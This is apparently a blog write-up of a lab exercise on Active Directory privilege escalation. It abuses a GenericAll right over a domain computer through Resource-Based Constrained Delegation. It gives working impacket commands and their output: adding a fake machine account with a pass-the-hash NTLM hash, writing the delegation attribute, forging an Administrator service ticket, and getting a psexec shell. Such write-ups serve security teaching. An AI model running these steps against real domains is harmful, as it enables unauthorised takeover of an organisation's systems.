+++
date = '2026-04-16T22:12:34+09:00'
draft = false
title = 'GenericAll permission on a domain computer'
tags = ["RBCD", "GenericAll"]
+++

# GenericAll permission on a domain computer

![bloodhound](/images/rbcd/genericall.png)

The user **l.livingstone** has **GenericAll** permission on the domain computer **RESOURCEDC$**.

GenericAll grants full control over the object — including the ability to write to `msDS-AllowedToActOnBehalfOfOtherIdentity`. This makes **Resource-Based Constrained Delegation (RBCD)** abuse possible: we create a machine account we control, configure the target to trust it for delegation, then impersonate any user (including Administrator) to obtain a service ticket via S4U2Proxy.

## Step 1 — Add a fake computer to the domain

`impacket-addcomputer` creates a new machine account in the domain. We authenticate as l.livingstone using her NTLM hash.

```bash
impacket-addcomputer resourced.local/l.livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'fake$' -computer-pass 'password!' -dc-ip 192.168.176.175

[*] Successfully added machine account fake$ with password password!
```

## Step 2 — Configure RBCD on the target computer

Using our GenericAll rights, write `fake$` into the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of `RESOURCEDC$`. This tells the target to trust `fake$` for delegation.

```bash
impacket-rbcd resourced.local/l.livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -delegate-from 'fake$' -delegate-to 'RESOURCEDC$' -action write -dc-ip 192.168.176.175

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] fake$ can now impersonate users on RESOURCEDC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     fake$        (S-1-5-21-537427935-490066102-1511301751-4101)
```

## Step 3 — Request a service ticket as Administrator

Using `impacket-getST`, perform S4U2Self + S4U2Proxy as `fake$` to obtain a CIFS ticket impersonating Administrator.

```bash
impacket-getST resourced.local/fake$:'password!' -spn cifs/resourcedc.resourced.local -impersonate Administrator -dc-ip 192.168.176.175

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
```

## Step 4 — Export the ticket

Set the `KRB5CCNAME` environment variable so Impacket tools pick up the saved ticket automatically.

```bash
export KRB5CCNAME=Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
```

## Step 5 — Connect via psexec

Since we authenticate with Kerberos, the target's hostname must resolve correctly. Add an entry to `/etc/hosts` if needed, then connect using the ticket.

```bash
impacket-psexec -k -no-pass resourcedc.resourced.local
```
